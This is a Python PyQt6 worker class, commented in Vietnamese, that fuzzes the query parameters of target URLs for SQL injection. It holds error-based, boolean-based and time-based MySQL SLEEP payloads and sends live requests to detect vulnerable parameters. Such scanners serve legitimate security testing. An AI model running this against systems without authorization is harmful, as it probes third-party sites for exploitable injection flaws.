import requests
import time
from urllib.parse import urlparse, parse_qs
from PyQt6.QtCore import QThread, pyqtSignal

class SQLiThread(QThread):
    # Các tín hiệu để gửi dữ liệu về giao diện chính
    ket_qua_scan = pyqtSignal(str, str, str) # URL, Payload, Loại lỗi
    log_process = pyqtSignal(str)            # Log tin nhắn
    hoan_thanh = pyqtSignal()                # Báo hoàn tất

    def __init__(self, list_urls):
        super().__init__()
        self.targets = list_urls
        self.is_running = True
        
        # 1. Payload Error-based
        self.error_payloads = ["'", "\"", "')"]
        
        # 2. Payload Boolean-based (True, False)
        self.boolean_payloads = [
            (" AND 1=1", " AND 1=2"),
            ("' AND '1'='1", "' AND '1'='2")
        ]
        
        # 3. Payload Time-based (MySQL) - Chờ 3 giây
        self.time_payloads = [
            " AND (SELECT 1 FROM (SELECT(SLEEP(3)))a)",
            "' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a) AND '1'='1"
        ]

        # Các dấu hiệu lỗi Database đặc trưng
        self.sql_errors = [
            "SQL syntax", "mysql_fetch_array", "Warning: mysql",
            "PostgreSQL query failed", "Oracle error", "Unclosed quotation mark",
            "MariaDB server version", "Microsoft OLE DB Provider for SQL Server"
        ]

    def build_url(self, base, params, target_p, payload):
        """Hàm dựng URL với payload được bơm vào tham số cụ thể"""
        parts = []
        for k, v in params.items():
            if k == target_p:
                # v là một list (do parse_qs), lấy phần tử đầu tiên
                parts.append(f"{k}={v[0]}{payload}")
            else:
                parts.append(f"{k}={v[0]}")
        return f"{base}?{'&'.join(parts)}"

    def run(self):
        self.log_process.emit(f"🚀 <b>Bắt đầu Fuzzing SQLi trên {len(self.targets)} mục tiêu...</b>")
        
        for url in self.targets:
            if not self.is_running: break
            
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            
            if not params: continue

            for param_name in params:
                if not self.is_running: break
                self.log_process.emit(f"[*] Đang kiểm tra tham số: <b style='color:green'>{param_name}</b> của {url}")

                # --- KIỂM TRA 1: ERROR-BASED ---
                for payload in self.error_payloads:
                    attack_url = self.build_url(base_url, params, param_name, payload)
                    try:
                        res = requests.get(attack_url, timeout=5)
                        for err in self.sql_errors:
                            if err.lower() in res.text.lower():
                                self.ket_qua_scan.emit(url, payload, f"SQLi (Error: {err})")
                                self.log_process.emit(f"<b style='color:red'>[!] Phát hiện Error-based SQLi: {param_name}</b>")
                                break
                    except: pass

                # --- KIỂM TRA 2: BOOLEAN-BASED ---
                for p_true, p_false in self.boolean_payloads:
                    try:
                        url_true = self.build_url(base_url, params, param_name, p_true)
                        url_false = self.build_url(base_url, params, param_name, p_false)
                        
                        res_true = requests.get(url_true, timeout=5)
                        res_false = requests.get(url_false, timeout=5)
                        
                        # So sánh độ dài hoặc nội dung phản hồi
                        if res_true.text != res_false.text and len(res_true.content) != len(res_false.content):
                            self.ket_qua_scan.emit(url, p_true, "SQLi (Boolean-based)")
                            self.log_process.emit(f"<b style='color:orange'>[!] Nghi vấn Boolean-based SQLi: {param_name}</b>")
                    except: pass

                # --- KIỂM TRA 3: TIME-BASED ---
                for t_payload in self.time_payloads:
                    attack_url = self.build_url(base_url, params, param_name, t_payload)
                    try:
                        start_time = time.time()
                        requests.get(attack_url, timeout=7)
                        duration = time.time() - start_time
                        
                        # Nếu thời gian phản hồi > 3 giây (như sleep(3) trong payload)
                        if duration >= 3.0:
                            self.ket_qua_scan.emit(url, t_payload, "SQLi (Time-based)")
                            self.log_process.emit(f"<b style='color:red'>[!] Phát hiện Time-based SQLi (Delay {round(duration,2)}s)</b>")
                    except: pass

        self.log_process.emit("🏁 <b>Fuzzing SQL Injection hoàn tất!</b>")
        self.hoan_thanh.emit()

    def stop(self):
        self.is_running = False